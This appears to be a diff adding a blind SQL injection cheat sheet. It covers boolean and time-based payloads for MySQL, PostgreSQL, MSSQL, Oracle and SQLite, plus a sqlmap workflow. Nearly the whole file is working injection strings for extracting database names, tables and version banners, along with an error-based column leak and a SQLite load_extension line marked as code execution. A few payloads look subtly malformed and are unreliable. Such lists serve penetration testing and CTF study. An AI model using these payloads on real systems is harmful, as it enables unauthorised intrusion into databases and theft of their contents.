@@ -1,0 +1,105 @@
+# BLIND: BOOLEAN + TIME (no visible output)
+# Workflow: (1) confirm with 1=1 vs 1=2, (2) count chars, (3) binary-search each char, (4) automate with sqlmap sqlmap -u TARGET --batch --dbs.
+
+## 1) Confirmation pairs (MySQL / Oracle / MSSQL / PG)
+1' AND 1=1-- -
+1' AND 1=2-- -
+1' OR 1=1-- -
+1' OR 1=2-- -
+1" AND 1=1-- -
+1" AND 1=2-- -
+1') AND 1=1-- -
+1') AND 1=2-- -
+1')) AND 1=1-- -
+1 AND 1=1-- -
+1 AND 1=2-- -
+1' AND 'a'='a
+1' AND 'a'='b
+
+## 2) Truthy existence checks
+1' AND EXISTS(SELECT 1 FROM users)-- -
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -
+1' OR LENGTH(database())>0-- -
+1' AND 1=(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')-- -
+
+## 3) Length extraction (MySQL)
+1' AND LENGTH(database())=4-- -
+1' AND LENGTH(user())=9-- -
+1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))=6-- -
+
+## 4) Char-by-char via string compare (MySQL)
+1' AND SUBSTRING(database(),1,1)='s'-- -
+1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='a'-- -
+1' AND ASCII(SUBSTRING(database(),1,1))>97-- -
+# Binary search the ASCII code >=97 expected for printable.
+
+## 5) PostgreSQL blind equivalents
+1' AND length(current_database())=4-- -
+1' AND substring(current_database() from 1 for 1)='s'-- -
+1' AND ascii(substring(current_database() from 1 for 1))>97-- -
+1' AND (SELECT 1 FROM pg_tables WHERE tablename='users') IS NOT NULL-- -
+
+## 6) MSSQL blind equivalents (TOP instead of LIMIT)
+1' AND LEN(DB_NAME())=4-- -
+1' AND SUBSTRING(DB_NAME(),1,1)='m'-- -
+1' AND ASCII(SUBSTRING(DB_NAME(),1,1))>97-- -
+1' AND (SELECT TOP 1 name FROM sysobjects)>'a'-- -
+# HAVING/ORDER BY hint leak on MSSQL (old trick, still works on legacy apps)
+' HAVING 1=1-- -            -> reveals column name in error
+' GROUP BY 1-- -
+
+## 7) Oracle blind
+1' AND LENGTH((SELECT banner FROM v$version WHERE rownum=1))>20-- -
+1' AND SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1)='O'-- -
+1' AND ASCII(SUBSTR((SELECT table_name FROM all_tables WHERE rownum=1),1,1))>65-- -
+
+## 8) TIME-BASED - MySQL
+# SLEEP() works in SELECT/WEB context. BENCHMARK is CPU-heavy alternative.
+1' AND SLEEP(5)-- -
+1' OR SLEEP(5)-- -
+1' AND SLEEP(5) AND '1'='1
+1' AND (SELECT SLEEP(5))-- -
+1' AND IF(1=1,SLEEP(5),0)-- -
+1' AND IF(LENGTH(database())=4,SLEEP(5),0)-- -
+1' OR (SELECT SLEEP(5))-- -
+1' AND BENCHMARK(10000000,MD5('a'))-- -
+1' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)-- -
+# No-quotes variant
+1' AND SLEEP(5) AND 1#
+1 UNION SELECT SLEEP(5),NULL#        # stacked union-sleep inside SELECT
+1 AND SLEEP(5)-- -
+1 OR SLEEP(5)-- -
+# Unterminated-string variant (param consumed as string)
+' OR SLEEP(5)='
+
+## 9) TIME-BASED - PostgreSQL
+1' AND pg_sleep(5)-- -
+1' OR pg_sleep(5)-- -
+1' AND (SELECT pg_sleep(5))-- -
+1' AND pg_sleep(6)-- -
+1' AND (SELECT pg_sleep(5) FROM generate_series(1,1))-- -
+1' AND CASE WHEN LENGTH(current_database())=4 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+1' OR C;SELECT pg_sleep(5)-- -        # stacked, PG often rejects - use 1' AND (SELECT 1 FROM pg_sleep(5))-- -
+
+## 10) TIME-BASED - MSSQL
+1' ; WAITFOR DELAY '0:0:5'-- -
+1' WAITFOR DELAY '0:0:5'-- -
+1' OR WAITFOR DELAY '0:0:5'-- -
+1';WAITFOR DELAY '0:0:5'-- -
+1';IF (SELECT LEN(DB_NAME()))=4 WAITFOR DELAY '0:0:5'-- -
+1';IF ASCII(SUBSTRING(DB_NAME(),1,1))>97 WAITFOR DELAY '0:0:5'-- -
+# Heavy query (no 'WAITFOR' keyword detection needed)
+1' AND (SELECT COUNT(*) FROM sysobjects A,sysobjects B,sysobjects C,sysobjects D,sysobjects E,sysobjects F,sysobjects G)>0-- -
+
+## 11) TIME-BASED - Oracle
+1' AND DBMS_LOCK.SLEEP(5)-- -
+1' OR DBMS_LOCK.SLEEP(5)-- -
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+1' AND CASE WHEN LENGTH((SELECT banner FROM v$version WHERE rownum=1))>20 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE '' END FROM dual-- -
+1'||(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))-- -
+
+## 12) SQLite (often RDBMS-backed CTF boxes)
+1' AND 1=1-- -
+1' AND length((SELECT sql FROM sqlite_master))=25-- -
+1' UNION SELECT sql,group_concat(sql) FROM sqlite_master-- -
+' AND (SELECT load_extension('lib_sqlite_mathfuncs'))-- -     # RCE if extension present
